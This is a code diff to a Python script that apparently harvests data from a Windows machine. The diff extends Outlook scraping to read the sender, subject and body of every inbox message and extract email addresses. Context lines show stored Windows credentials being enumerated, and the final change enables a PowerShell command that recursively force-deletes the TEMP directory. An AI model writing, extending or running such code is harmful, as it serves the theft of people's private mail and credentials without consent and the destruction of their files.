@@ -22,6 +22,7 @@ from charset_normalizer import from_bytes
 from chardet import detect
 import plyvel
 import snappy
+import pythoncom
 import json
 
 USERNAME = getpass.getuser()
@@ -753,12 +754,27 @@ try:
 except: pass 
 
 try:
+    pythoncom.CoInitialize()
     outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-    for folder in outlook.Folders:
-        for item in folder.Items:
-            if item.Class == 43:
-                emails.extend(item.SenderEmailAddress)
-except: pass 
+    inbox = outlook.GetDefaultFolder(6)  # 6 is the inbox folder
+    messages = inbox.Items
+    messages.Sort("[ReceivedTime]", True)
+    message = messages.GetLast()
+    while message:
+        try:
+            sender = getattr(message, 'SenderEmailAddress', '')  # Check if SenderEmailAddress exists
+            subject = getattr(message, 'Subject', '')  # Check if Subject exists
+            body = getattr(message, 'Body', '')  # Check if Body exists
+            emails.extend(re.findall(email_pattern, sender))
+            emails.extend(re.findall(email_pattern, subject))
+            emails.extend(re.findall(email_pattern, body))
+            message = messages.Previous()
+        except Exception as e:
+            print(f"Error processing message: {e}")
+            message = messages.Previous()
+            continue
+except Exception as e: print(f"Outlook COM API error: {e}") 
+finally: pythoncom.CoUninitialize()
 
 try:
     creds = win32cred.CredEnumerate(None, 0)
@@ -778,4 +794,4 @@ for email in emails:
     print(email)
 print(len(emails))
 
-# os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
+os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")
